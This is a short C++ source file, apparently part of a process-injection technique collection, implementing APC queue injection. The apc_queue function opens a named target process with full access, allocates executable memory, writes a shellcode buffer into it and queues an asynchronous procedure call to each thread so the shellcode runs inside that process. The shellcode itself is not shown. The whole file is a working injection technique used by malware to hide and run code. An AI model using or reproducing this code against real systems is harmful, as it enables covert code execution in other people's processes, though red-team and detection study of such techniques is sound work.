#include "inject.h"

auto apc_queue(std::string const &process_name) -> bool
{
  LPVOID shellcode_addr = NULL;
  auto found = ::ul::walk_threads_using_toolhelp(process_name, [&](::ul::Thread const &thread) -> ::ul::walk_t {
    if (!shellcode_addr) {
      ::ul::info("Inject shellcode into target process");
      auto process_handle = ::OpenProcess(PROCESS_ALL_ACCESS, 0, thread.process.pid);
      shellcode_addr = ::VirtualAllocEx(process_handle, NULL, sizeof(g_shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      WriteProcessMemory(process_handle, shellcode_addr, g_shellcode, sizeof(g_shellcode), NULL);
    }

    ::ul::info(std::format("Queue APC to target thread {}", thread.tid));
    auto thread_handle = ::OpenThread(THREAD_ALL_ACCESS, TRUE, thread.tid);
    ::QueueUserAPC((PAPCFUNC)shellcode_addr, thread_handle, NULL);
    Sleep(1000);
    return ::ul::walk_t::WALK_CONTINUE;
  });

  if (!found) {
    ::ul::error("Process not found");
  }

  return found;
}